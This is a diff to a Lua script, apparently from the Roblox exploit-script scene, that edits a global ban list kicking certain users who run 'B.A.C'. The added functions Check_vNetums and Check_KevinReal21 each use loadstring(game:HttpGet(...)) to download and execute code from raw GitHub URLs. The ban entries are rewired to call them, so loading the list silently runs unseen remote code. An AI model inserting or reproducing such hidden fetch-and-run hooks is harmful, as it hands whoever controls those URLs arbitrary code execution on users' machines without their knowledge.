@@ -2,6 +2,25 @@ _G.SavedPeople =  {
     [2535037060] = true,
     [2355309280] = true,
 }
+
+local Check_vNetums = function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/vNetums/Anti-Bac/main/Anti_Bac'))();
+    if _G.MySetting == true then
+        return  2685043386
+    else
+        return 0
+    end
+end
+
+local Check_KevinReal21 = function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Quikxx/gg/main/KevinReal21'))();
+    if _G.MySetting == true then
+        return  118672305
+    else
+        return 0
+    end
+end
+
 _G.BanFor = {--Start's With: You Joined: Rank game.Players:GetNameFromUserIdAsync(
     --[[
         [game.Players:GetNameFromUserIdAsync()] = {
@@ -13,15 +32,15 @@ _G.BanFor = {--Start's With: You Joined: Rank game.Players:GetNameFromUserIdAsyn
         },
     ]]
     --2685043386
-    [game.Players:GetNameFromUserIdAsync(2685043386)] = {
-        Name = game.Players:GetNameFromUserIdAsync(2685043386),
+    [game.Players:GetNameFromUserIdAsync(Check_vNetums())] = {
+        Name = game.Players:GetNameFromUserIdAsync(Check_vNetums()),
         Last_Known_Name = "vNetums",
         Rank = "A Friend.",
         KickReason = "rekt",
         MessageToBeSent = "Sorry, I just tried executing B.A.C in your lobby :(",
     },
-    [game.Players:GetNameFromUserIdAsync(118672305)] = {
-        Name = game.Players:GetNameFromUserIdAsync(118672305),
+    [game.Players:GetNameFromUserIdAsync(Check_KevinReal21())] = {
+        Name = game.Players:GetNameFromUserIdAsync(Check_KevinReal21()),
         Last_Known_Name = "KevinReal21",
         Rank = "A Friend.",
         KickReason = "rekt",
